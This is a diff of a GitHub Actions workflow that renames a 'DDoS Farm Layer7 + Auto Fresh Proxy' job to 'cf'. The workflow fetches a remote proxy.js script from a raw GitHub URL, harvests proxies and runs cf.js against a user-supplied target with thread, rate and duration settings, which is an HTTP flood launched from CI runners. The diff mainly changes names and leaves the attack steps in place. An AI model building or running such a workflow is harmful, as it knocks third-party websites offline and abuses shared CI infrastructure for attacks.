@@ -1,4 +1,4 @@
-name: DDoS Farm Layer7 + Auto Fresh Proxy
+name: cf
 
 on:
   workflow_dispatch:
@@ -28,12 +28,12 @@ jobs:
           wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
           chmod +x *
 
-      - name: Lấy proxy tươi
+      - name: modunle and proxy
         run: |
           npm install hpack cluster
           node proxy.js
 
-      - name: Bắn Layer7 (CHẠY THẲNG KHÔNG HỎI)
+      - name: start ddos
         run: |
           node cf.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt --full --cache --debug
 
